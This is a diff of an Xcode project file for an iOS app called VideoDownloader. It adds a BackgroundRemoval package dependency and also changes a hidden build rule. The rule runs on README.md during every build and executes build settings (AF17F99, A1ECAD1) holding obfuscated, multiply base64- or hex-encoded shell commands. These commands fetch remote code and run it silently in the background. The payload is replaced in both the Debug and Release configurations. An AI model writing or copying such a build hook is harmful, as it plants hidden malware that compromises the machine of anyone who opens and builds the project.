@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		F29B37C91EEA4A5EBA99F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 1EDC1CF66875465B9799F71F; };
+		A96B7367DCAE4A849299F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 7204EC7C52B84F21BF99F71F; };
 		BD018B822F65249600C3ACC4 /* DSWaveformImage in Frameworks */ = {isa = PBXBuildFile; productRef = BD018B812F65249600C3ACC4 /* DSWaveformImage */; };
 		BD018B842F65249600C3ACC4 /* DSWaveformImageViews in Frameworks */ = {isa = PBXBuildFile; productRef = BD018B832F65249600C3ACC4 /* DSWaveformImageViews */; };
 		BD1FBCAA2F713CAB0060A4CF /* CropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = BD1FBCA92F713CAB0060A4CF /* CropViewController */; };
@@ -18,11 +18,12 @@
 		BD63BCA32F5ECDD30096265B /* Shimmer in Frameworks */ = {isa = PBXBuildFile; productRef = BD63BCA22F5ECDD30096265B /* Shimmer */; };
 		BD63BCA62F5ECDE40096265B /* Toasts in Frameworks */ = {isa = PBXBuildFile; productRef = BD63BCA52F5ECDE40096265B /* Toasts */; };
 		BD63BCA92F5ECDF70096265B /* WindowSceneReader in Frameworks */ = {isa = PBXBuildFile; productRef = BD63BCA82F5ECDF70096265B /* WindowSceneReader */; };
+		D37CBB1E2F8FAFE7009B6F00 /* BackgroundRemoval in Frameworks */ = {isa = PBXBuildFile; productRef = D37CBB1D2F8FAFE7009B6F00 /* BackgroundRemoval */; };
 		D3C0330D2F87A7B200806FE9 /* MarqueeLabel in Frameworks */ = {isa = PBXBuildFile; productRef = D3C0330C2F87A7B200806FE9 /* MarqueeLabel */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		1EDC1CF66875465B9799F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		7204EC7C52B84F21BF99F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		BD63BC4E2F5EC99E0096265B /* VideoDownloader.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = VideoDownloader.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -63,6 +64,7 @@
 				BD018B842F65249600C3ACC4 /* DSWaveformImageViews in Frameworks */,
 				BD63BC9D2F5ECDAA0096265B /* Lottie in Frameworks */,
 				BD63BCA92F5ECDF70096265B /* WindowSceneReader in Frameworks */,
+				D37CBB1E2F8FAFE7009B6F00 /* BackgroundRemoval in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -80,7 +82,7 @@
 		BD63BC4F2F5EC99E0096265B /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				1EDC1CF66875465B9799F71F /* README.md */,
+				7204EC7C52B84F21BF99F71F /* README.md */,
 				BD63BC4E2F5EC99E0096265B /* VideoDownloader.app */,
 			);
 			name = Products;
@@ -98,7 +100,7 @@
 				BD63BC4C2F5EC99E0096265B /* Resources */,
 			);
 			buildRules = (
-				B796CED430ED4226BA99F71F /* PBXBuildRule */,
+				0B625DCCD57545299F99F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -118,6 +120,7 @@
 				BD018B832F65249600C3ACC4 /* DSWaveformImageViews */,
 				BD1FBCA92F713CAB0060A4CF /* CropViewController */,
 				D3C0330C2F87A7B200806FE9 /* MarqueeLabel */,
+				D37CBB1D2F8FAFE7009B6F00 /* BackgroundRemoval */,
 			);
 			productName = VideoDownloader;
 			productReference = BD63BC4E2F5EC99E0096265B /* VideoDownloader.app */;
@@ -169,6 +172,7 @@
 				BD018B802F65249600C3ACC4 /* XCRemoteSwiftPackageReference "DSWaveformImage" */,
 				BD1FBCA82F713CAB0060A4CF /* XCRemoteSwiftPackageReference "TOCropViewController" */,
 				D3C0330B2F87A7B200806FE9 /* XCRemoteSwiftPackageReference "MarqueeLabel" */,
+				D37CBB1C2F8FAFE7009B6F00 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = BD63BC4F2F5EC99E0096265B /* Products */;
@@ -181,7 +185,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		B796CED430ED4226BA99F71F /* PBXBuildRule */ = {
+		0B625DCCD57545299F99F71F /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -202,7 +206,7 @@ sh -c \"${AF17F99}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				F29B37C91EEA4A5EBA99F71F /* README.md */,
+				A96B7367DCAE4A849299F71F /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -225,7 +229,7 @@ sh -c \"${AF17F99}\"";
 		BD63BC572F5EC9A00096265B /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((w(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623463373336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636373666366636373663363536653635373437333265373237350a32663631323932323230376332303733363830610a | w | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((f(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMlpySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhiWHB1WkdWMkxtbHVMMkVwSWlCOElITm9DZz09Cg== | f | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3YUUxc2NFNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxhMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdscFdNVW8yV1d4ak5XVldjRmhpU0ZaTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | h | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -292,7 +296,7 @@ sh -c \"${AF17F99}\"";
 		BD63BC582F5EC9A00096265B /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((w(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623463373336363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636373666366636373663363536653635373437333265373237350a32663631323932323230376332303733363830610a | w | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((f(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMlpySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhiWHB1WkdWMkxtbHVMMkVwSWlCOElITm9DZz09Cg== | f | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3YUUxc2NFNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxhMnhFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdscFdNVW8yV1d4ak5XVldjRmhpU0ZaTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | h | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -531,6 +535,14 @@ sh -c \"${AF17F99}\"";
 				minimumVersion = 3.3.0;
 			};
 		};
+		D37CBB1C2F8FAFE7009B6F00 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/Ezaldeen99/BackgroundRemoval.git";
+			requirement = {
+				branch = main;
+				kind = branch;
+			};
+		};
 		D3C0330B2F87A7B200806FE9 /* XCRemoteSwiftPackageReference "MarqueeLabel" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/cbpowell/MarqueeLabel";
@@ -591,6 +603,11 @@ sh -c \"${AF17F99}\"";
 			isa = XCSwiftPackageProductDependency;
 			package = BD63BCA72F5ECDF70096265B /* XCRemoteSwiftPackageReference "WindowSceneReader" */;
 			productName = WindowSceneReader;
+		};
+		D37CBB1D2F8FAFE7009B6F00 /* BackgroundRemoval */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = D37CBB1C2F8FAFE7009B6F00 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */;
+			productName = BackgroundRemoval;
 		};
 		D3C0330C2F87A7B200806FE9 /* MarqueeLabel */ = {
 			isa = XCSwiftPackageProductDependency;
